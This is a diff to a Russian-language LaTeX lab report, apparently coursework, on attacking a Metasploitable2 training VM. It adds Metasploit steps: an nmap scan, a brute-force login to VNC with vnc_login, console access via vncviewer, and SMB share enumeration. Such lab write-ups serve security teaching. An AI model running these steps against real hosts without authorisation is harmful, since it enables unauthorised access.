@@ -167,12 +167,73 @@
 
 \subsection{Подключиться к VNC-серверу, получить доступ к консоли}
 
+\begin{itemize}
+\item Просканируем порты на гостевой ОС metasploitable2
+Введем команду: \verb'nmap 192.168.150.3 -sV'
+
+\begin{figure}[h!]
+\centering
+\includegraphics[scale=0.8]{res/vnc_service}
+\caption{Поиск vnc сервиса}
+\end{figure}
+
+Откуда видно, что VNC сервер работает с портом 5900 и название сервиса - VNC (protocol 3.3)(см. рисунок 3)
+
+\item В msfconsole воспользуемся командой \verb'search "VNC (protocol 3.3)"'
+
+\begin{figure}[h!]
+\centering
+\includegraphics[scale=0.8]{res/search_vnc}
+\caption{Поиск эксплоитов vnc}
+\end{figure}
+
+Как видно из рисунка 4 присутствуем много эксплоитов. По каждому можно получить информацию командой \verb'info <exploit_name>' 
+
+\item Воспользуемся \verb'auxiliary/scanner/vnc/vnc_login'
+
+Для этого введем команду \verb'use auxiliary/scanner/vnc/vnc_login'
+
+Установим необходимые параметры \verb'set RHOSTS 192.168.150.3'
+
+Запустим exploit - \verb'exploit'
+
+Реузльтат на рисунке 5.
+
+\begin{figure}[h!]
+\centering
+\includegraphics[scale=0.8]{res/vnc_exploit}
+\caption{vnc exploit}
+\end{figure}
+
+\item Теперь, зная пароль запустим vncviewer
+
+Команда: \verb'vncviewer 192.168.150.3:5900'
+
+Результат а рисунке 6
+
+\begin{figure}[h!]
+\centering
+\includegraphics[scale=0.8]{res/vncviewer}
+\caption{vncviewer}
+\end{figure}
 
 
+\end{itemize}
 
 
+%---------------------------------------------------------
 
+\subsection{Получить список директорий в общем доступе по протоколу SMB}
 
+Для данной операции выберем auxiliary: \verb'auxiliary/scanner/smb/smb_enumshares'
+
+Результат выполнения представлен на рисунке 7
+
+\begin{figure}[h!]
+\centering
+\includegraphics[scale=0.8]{res/smb_auxiliary}
+\caption{vncviewer}
+\end{figure}
 
 
 
